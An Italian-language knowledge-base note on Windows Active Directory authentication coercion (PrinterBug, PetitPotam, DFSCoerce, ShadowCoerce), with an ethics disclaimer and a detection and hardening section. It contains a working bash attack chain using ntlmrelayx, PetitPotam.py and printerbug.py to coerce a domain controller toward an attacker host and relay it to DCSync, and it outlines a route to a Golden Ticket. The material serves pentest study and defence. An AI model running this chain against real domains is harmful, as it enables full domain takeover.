---
tipo: concetto
tag: [windows, ad]
fase: 3
fonti: 3
aggiornato: 2026-06-21
stato: maturo
aliases: ["PrinterBug", "Coercizione", "PetitPotam", "SpoolSample"]
---

# PrinterBug e Coercizione

> **Nota etica**: solo lab autorizzati o engagement con permesso scritto.

## In breve
La **coercizione di autenticazione** forza un host Windows (spesso un **Domain Controller** o un'altra macchina) a **autenticarsi verso un sistema scelto dall'attaccante**, come *account macchina*. Non serve compromettere il bersaglio: basta abusare di RPC esposte. Il risultato (un'auth [[NTLM]] della macchina) si combina con [[NTLM Relay]] per compromettere il dominio, o si usa contro la **unconstrained delegation** per catturare il TGT del DC (vedi [[Kerberos]]).

## Le varianti principali
| Nome | Protocollo RPC | Metodo | Note |
|---|---|---|---|
| **PrinterBug** / SpoolSample | MS-RPRN (Print Spooler) | `RpcRemoteFindFirstPrinterChangeNotificationEx` | richiede Spooler attivo |
| **PetitPotam** | MS-EFSR (EFS) | `EfsRpcOpenFileRaw` ecc. | spesso funziona **senza credenziali** |
| **DFSCoerce** | MS-DFSNM | `NetrDfsAddStdRoot` | bersaglia il servizio DFS |
| **ShadowCoerce** | MS-FSRVP | shadow copy | mitigato a tratti |

## Catena d'attacco classica (PetitPotam → relay → DCSync)
```bash
# 1. Avvia il relay verso LDAP/AD CS del DC
impacket-ntlmrelayx -t ldap://dc01.dominio.local --delegate-access -smb2support
#    (o -t http://ca01/certsrv/certfnsh.asp per ESC8/AD CS → certificato del DC)

# 2. Coerci il DC ad autenticarsi verso l'attaccante
python3 PetitPotam.py -u user -p pass <attacker-ip> <dc-ip>
#    PrinterBug equivalente:
printerbug.py dominio/user:pass@<dc-ip> <attacker-ip>

# 3. Il relay imposta RBCD o ottiene un certificato → impersoni il DC → [[DCSync]]
```
Contro **unconstrained delegation**: coerci il DC verso un host con UD che controlli → il TGT del DC finisce nella tua cache → estrai con [[Mimikatz]] → **Golden Ticket**.

## Detection e difesa
- **Disabilitare il Print Spooler** sui DC e server che non stampano (chiude PrinterBug).
- Patch **PetitPotam** (KB) + disabilitare NTLM verso AD CS; abilitare **EPA**/**SMB & LDAP signing** (spezza il [[NTLM Relay]] a valle).
- Mettere i DC/account sensibili nel gruppo **Protected Users** e marcarli *sensitive, cannot be delegated*.
- Detection: chiamate **MS-RPRN/MS-EFSR** verso host non previsti; auth NTLM **machine account** verso sistemi insoliti; Event 4624 logon type 3 dal `DC$`.
- MITRE: **T1187** (Forced Authentication).

## Collegamenti
- [[NTLM Relay]] — consuma l'auth coercita
- [[NTLM]] · [[Kerberos]] — delega unconstrained e Golden Ticket
- [[Active Directory]] · [[DCSync]] · [[Impacket]] · [[Mimikatz]]

## Fonti
- The Hacker Recipes — Forced authentications: https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications
- topotam/PetitPotam: https://github.com/topotam/PetitPotam
- MITRE ATT&CK — T1187: https://attack.mitre.org/techniques/T1187/
